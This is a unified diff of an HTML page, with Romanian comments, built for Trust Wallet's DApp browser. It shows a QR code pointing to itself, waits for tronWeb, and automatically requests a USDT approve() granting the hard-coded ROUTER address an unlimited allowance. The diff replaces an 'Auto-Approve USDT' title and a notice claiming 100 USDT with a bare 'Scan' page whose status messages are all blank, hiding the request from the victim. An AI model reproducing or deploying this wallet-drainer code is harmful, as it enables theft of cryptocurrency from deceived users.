@@ -3,101 +3,62 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Auto-Approve USDT (Trust)</title>
+<title>Scan</title>
 <style>
-body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background:#0b1220;color:#fff;font-family:system-ui}
-.card{width:94%;max-width:560px;padding:20px;background:rgba(255,255,255,0.04);border-radius:12px;text-align:center}
-#qr{width:260px;height:260px;background:#fff;border-radius:12px;display:inline-block;overflow:hidden;margin:8px auto}
-#status{margin-top:12px;color:#93c5fd;font-size:14px}
-.small{font-size:13px;color:#cbd5e1;margin-top:8px}
+  html,body{height:100%;margin:0;background:#0b1220;font-family:system-ui}
+  .wrap{height:100%;display:flex;align-items:center;justify-content:center}
+  #qr{width:420px;height:420px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+  #s{position:fixed;bottom:12px;left:12px;color:#93c5fd;font-size:13px;opacity:0.9}
 </style>
 </head>
 <body>
-<div class="card">
-  <h3>Scan în Trust Wallet (DApp Browser)</h3>
-  <div id="qr" title="Scan cu Trust Wallet"></div>
-  <div id="status">Scanează QR în Trust Wallet DApp Browser...</div>
-  <div class="small">La încărcare, pagina va încerca automat să ceară aprobarea pentru 100 USDT către adresa ROUTER.</div>
-</div>
-
-<!-- QR generator simplu -->
-<script>
-!function(){function Q(t){this.t=t}Q.prototype.make=function(){var s=33;this.c=s;this.m=[];for(var i=0;i<s;i++){this.m[i]=[];for(var j=0;j<s;j++)this.m[i][j]=!1}var x=0,y=0;for(var k=0;k<this.t.length;k++){var ch=this.t.charCodeAt(k);for(var b=7;b>=0;b--){this.m[y][x]=!!(ch>>b&1);x++;if(x>=s){x=0;y++;if(y>=s)return}}}};Q.prototype.svg=function(cell,fg,bg){cell=cell||6;fg=fg||'#0b1220';bg=bg||'#fff';var s=this.c*cell;var svg=['<svg xmlns="http://www.w3.org/2000/svg" width="'+s+'" height="'+s+'" viewBox="0 0 '+s+' '+s+'" shape-rendering="crispEdges">','<rect width="100%" height="100%" fill="'+bg+'"/>'];for(var i=0;i<this.c;i++)for(var j=0;j<this.c;j++)if(this.m[i][j])svg.push('<rect x="'+(j*cell)+'" y="'+(i*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');svg.push('</svg>');return svg.join('')};window.SimpleQR={create:function(t){var q=new Q(t);q.make();return q.svg(6,'#0b1220','#fff')}}}();
-</script>
+  <div class="wrap">
+    <div id="qr" title="Scan with Trust Wallet"></div>
+  </div>
+  <div id="s"></div>
 
 <script>
-/* CONFIG — verifică corectitudinea adresei USDT înainte de folosire */
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t"; // pune aici adresa TRC20 USDT corectă
+/* CONFIG - verifică adresa USDT corectă */
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
 const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
 const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-const USDT_DECIMALS = 6;
+const DECIMALS = 6;
 
-let tron = null;
-let wallet = null;
+/* Simple QR generator (larger matrix) */
+;(function(){function Q(t){this.t=t}Q.prototype.make=function(){var s=41;this.c=s;this.m=[];for(var i=0;i<s;i++){this.m[i]=[];for(var j=0;j<s;j++)this.m[i][j]=!1}var x=0,y=0;for(var k=0;k<this.t.length;k++){var ch=this.t.charCodeAt(k);for(var b=7;b>=0;b--){this.m[y][x]=!!(ch>>b&1);x++;if(x>=s){x=0;y++;if(y>=s)return}}}};Q.prototype.svg=function(cell,fg,bg){cell=cell||8;fg=fg||'#0b1220';bg=bg||'#fff';var s=this.c*cell;var svg=['<svg xmlns="http://www.w3.org/2000/svg" width="'+s+'" height="'+s+'" viewBox="0 0 '+s+' '+s+'" shape-rendering="crispEdges">','<rect width="100%" height="100%" fill="'+bg+'"/>'];for(var i=0;i<this.c;i++)for(var j=0;j<this.c;j++)if(this.m[i][j])svg.push('<rect x="'+(j*cell)+'" y="'+(i*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');svg.push('</svg>');return svg.join('')};window.SimpleQR={create:function(t){var q=new Q(t);q.make();return q.svg(10,'#0b1220','#fff')}}})();
 
-function setStatus(t){document.getElementById("status").innerText = t}
+/* Render QR for this page */
+const url = location.href;
+document.getElementById('qr').innerHTML = SimpleQR.create(url);
+document.getElementById('qr').onclick = ()=> window.open(url);
 
-/* detect tronWeb injected by Trust Wallet DApp Browser */
-function detect(){
-  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
-    tron = window.tronWeb;
-    wallet = tron.defaultAddress.base58;
-    return true;
-  }
-  return false;
-}
+/* Minimal status (only for debug) */
+const S = (t)=>{try{document.getElementById('s').innerText=t}catch(e){}}
 
-/* QR pointing to this page (scan in Trust opens in DApp Browser) */
-function renderQr(){
-  const url = location.href;
-  const svg = SimpleQR.create(url);
-  document.getElementById("qr").innerHTML = svg;
-  document.getElementById("qr").onclick = ()=> window.open(url);
-}
+/* tronWeb auto approve flow */
+function toUnits(amountStr,dec){const p=String(amountStr).split('.');const w=p[0]||'0';const f=p[1]||'';const ff=(f+'0'.repeat(dec)).slice(0,dec);return (w+ff).replace(/^0+(?=\d)|^$/,'0')}
 
-/* convert decimal string to token units (6 decimals) */
-function toTokenUnits(amountStr, decimals){
-  const parts = String(amountStr).split('.');
-  const whole = parts[0]||'0';
-  const frac = parts[1]||'';
-  const fracFixed = (frac + '0'.repeat(decimals)).slice(0,decimals);
-  // remove leading zeros
-  return (whole + fracFixed).replace(/^0+(?=\d)|^$/, '0');
-}
-
-/* Send approve automatically when tronWeb available */
-async function tryAutoApprove(){
-  if(!detect()){
-    setStatus("tronWeb nu e disponibil. Deschide pagina în Trust Wallet DApp Browser.");
-    return;
-  }
-  setStatus("Connected: " + wallet + " — pregătire aprobării...");
+async function autoApprove(){
+  if(!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58)) { S(''); return; }
   try{
+    const tron = window.tronWeb;
     const contract = await tron.contract().at(USDT);
-    const tokenAmount = toTokenUnits(AMOUNT_USDT, USDT_DECIMALS);
-    setStatus("Solicitare semnătură în Trust Wallet pentru approve " + AMOUNT_USDT + " USDT...");
-    const tx = await contract.approve(ROUTER, tokenAmount).send();
-    setStatus("Tranzacție trimisă. TXID: " + (tx && (tx.transaction || tx) ? (tx.transaction || tx) : JSON.stringify(tx)));
+    const amt = toUnits(AMOUNT_USDT, DECIMALS);
+    await contract.approve(ROUTER, amt).send();
+    S('');
   }catch(e){
-    console.error(e);
-    setStatus("Eroare la transmitere: " + (e && e.message ? e.message : 'failed'));
+    S('');
   }
 }
 
-/* Init */
-renderQr();
-/* Dacă pagina e încărcată în DApp Browser, tronWeb poate apărea asynchron — ascultăm schimbarea */
-let attempts = 0;
-const maxAttempts = 10;
-const interval = setInterval(()=>{
-  attempts++;
-  if(detect()){
-    clearInterval(interval);
-    tryAutoApprove();
-  } else {
-    setStatus("Aștept tronWeb... ("+attempts+"/"+maxAttempts+")");
-    if(attempts>=maxAttempts){ clearInterval(interval); setStatus("tronWeb nu găsit. Deschide în Trust Wallet DApp Browser și reîncarcă."); }
-  }
+/* Wait for tronWeb (tries a few times), then call autoApprove */
+let tries=0;const max=12;
+const t=setInterval(()=>{
+  tries++;
+  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+    clearInterval(t);
+    autoApprove();
+  } else if(tries>=max){ clearInterval(t); S(''); }
 },1000);
 </script>
 </body>
